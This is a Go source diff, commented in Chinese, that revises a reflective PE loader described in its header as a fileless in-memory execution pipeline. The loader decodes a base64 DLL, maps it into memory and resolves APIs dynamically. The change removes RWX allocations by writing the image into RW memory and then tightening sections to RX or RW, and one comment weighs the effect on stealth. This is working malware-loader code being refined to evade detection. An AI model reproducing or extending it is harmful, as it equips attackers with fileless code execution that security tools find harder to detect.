@@ -8,8 +8,6 @@ import (
 	"fmt"
 	"syscall"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
 // 全内存无文件执行管道 —— 反射式 PE 加载器。
@@ -26,11 +24,15 @@ const (
 )
 
 type memSection struct {
-	virtualAddress uint32
-	virtualSize    uint32
-	rawSize        uint32
-	rawOffset      uint32
+	virtualAddress  uint32
+	virtualSize     uint32
+	rawSize         uint32
+	rawOffset       uint32
+	characteristics uint32
 }
+
+// 节属性位（IMAGE_SCN_MEM_*）：用于映射完成后按节收紧页保护。
+const scnMemExecute = 0x20000000 // IMAGE_SCN_MEM_EXECUTE
 
 type memPE struct {
 	is64          bool
@@ -75,13 +77,17 @@ func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 	return fmt.Sprintf("DLL reflectively loaded at 0x%x (%d bytes)", base, len(raw)), 0, ""
 }
 
+// mapImagePE 反射式映射 PE 镜像：先以 RW（可写不可执行）申请整块镜像内存，
+// 完成头部/节拷贝、重定位、导入表填充后，再按节属性收紧为 RX / RW（绝不留 RWX），
+// 返回的镜像从头到尾没有"同时可写可执行"的时刻。
 func mapImagePE(raw []byte) (uintptr, *memPE, error) {
 	info, err := parseMemPE(raw)
 	if err != nil {
 		return 0, nil, err
 	}
 
-	base, err := windows.VirtualAlloc(0, uintptr(info.sizeOfImage), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	// 阶段 1（写入）：RW 申请，绝不请求 PAGE_EXECUTE_READWRITE。
+	base, _, err := allocRW(uintptr(info.sizeOfImage))
 	if err != nil {
 		return 0, nil, fmt.Errorf("VirtualAlloc failed: %w", err)
 	}
@@ -96,6 +102,7 @@ func mapImagePE(raw []byte) (uintptr, *memPE, error) {
 		copyMem(base+uintptr(s.virtualAddress), raw[int(s.rawOffset):int(s.rawOffset)+int(s.rawSize)], int(s.rawSize))
 	}
 
+	// 重定位与导入表填充同样在 RW 阶段完成（此时内存还不可执行）
 	if err := applyRelocs(base, info); err != nil {
 		return 0, nil, err
 	}
@@ -103,10 +110,48 @@ func mapImagePE(raw []byte) (uintptr, *memPE, error) {
 		return 0, nil, err
 	}
 
+	// 阶段 2（收紧保护）：可执行节 → RX，数据节 → RW；此后再无 RWX 页。
+	if err := protectImageSections(base, info); err != nil {
+		return 0, nil, err
+	}
+
 	// 刷新指令缓存（x86/x64 上通常为空操作，ARM 上必需）
 	resolveAPI("kernel32.dll", "FlushInstructionCache").Call(^uintptr(0), base, uintptr(info.sizeOfImage))
 
 	return base, info, nil
+}
+
+// protectImageSections 按节属性收紧已写入镜像的页保护，保证不存在 RWX 页：
+//
+//   - 声明 IMAGE_SCN_MEM_EXECUTE 的节 → PAGE_EXECUTE_READ（RX）；
+//   - 入口点所在节同样强制 RX（兼容个别未标执行位的畸形镜像）；
+//   - 其它节（.data/.rdata/.bss 等）→ PAGE_READWRITE（RW），运行期全局变量读写正常。
+//
+// 注意：若某节同时声明"可写 + 可执行"（加壳/自解码载荷），这里也**只给 RX**，
+// 即宁可不支持该节的运行期自改，也不申请 RWX。镜像头部保留 RW（只读头部对
+// 隐蔽性无实质影响，且避免低对齐镜像中头部与首节共享页时误伤数据）。
+func protectImageSections(base uintptr, info *memPE) error {
+	for _, s := range info.sections {
+		size := s.virtualSize
+		if s.rawSize > size {
+			size = s.rawSize
+		}
+		if size == 0 {
+			continue
+		}
+		addr := base + uintptr(s.virtualAddress)
+		holdsEntry := info.entryRVA >= s.virtualAddress && info.entryRVA < s.virtualAddress+size
+		var err error
+		if s.characteristics&scnMemExecute != 0 || holdsEntry {
+			err = protectRX(addr, uintptr(size))
+		} else {
+			err = protectRW(addr, uintptr(size))
+		}
+		if err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 // parseMemPE 解析 PE 头（DOS/NT 头、可选头、节表、数据目录）。
@@ -174,10 +219,11 @@ func parseMemPE(raw []byte) (*memPE, error) {
 			break
 		}
 		info.sections = append(info.sections, memSection{
-			virtualSize:    binary.LittleEndian.Uint32(raw[off+8 : off+12]),
-			virtualAddress: binary.LittleEndian.Uint32(raw[off+12 : off+16]),
-			rawSize:        binary.LittleEndian.Uint32(raw[off+16 : off+20]),
-			rawOffset:      binary.LittleEndian.Uint32(raw[off+20 : off+24]),
+			virtualSize:     binary.LittleEndian.Uint32(raw[off+8 : off+12]),
+			virtualAddress:  binary.LittleEndian.Uint32(raw[off+12 : off+16]),
+			rawSize:         binary.LittleEndian.Uint32(raw[off+16 : off+20]),
+			rawOffset:       binary.LittleEndian.Uint32(raw[off+20 : off+24]),
+			characteristics: binary.LittleEndian.Uint32(raw[off+36 : off+40]),
 		})
 	}
 
